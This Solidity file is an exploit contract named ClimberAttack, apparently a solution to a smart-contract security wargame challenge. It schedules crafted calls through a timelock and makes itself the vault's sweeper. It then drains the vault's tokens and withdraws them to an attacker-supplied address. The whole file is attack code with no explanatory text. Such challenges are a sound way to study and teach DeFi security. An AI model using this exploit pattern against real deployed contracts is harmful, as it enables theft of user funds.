// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface IVault{
    function _setSweeper(address newSweeper) external; 
    function sweepFunds(address tokenAddress) external;
}
interface ITimeLock{
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external ;
}

contract ClimberAttack{

    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    address timelock;
    address vault;
    address newImpl;
    bytes32 salt = bytes32(abi.encode('salt'));
    address[] targets;
    uint256[] values;
    bytes[] data; 
    address token ;
    constructor (address _timelock,address _vault ,address impl,address _token)  {
        timelock = _timelock;
        vault = _vault;
        newImpl = impl;
        token = _token;
    }

    function setData(address[] memory _targets,bytes[] memory _data) public {
        targets = _targets;
        data = _data;
    }
    function attack() public{
        
        values = [uint256(0),0,0,0];
        ITimeLock(timelock).schedule(targets,values,data,0);

        IVault(vault)._setSweeper(address(this));
        IVault(vault).sweepFunds(token);
    }

    function withdraw(address payable attacker) public{
        uint amount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(attacker, amount);
    }
}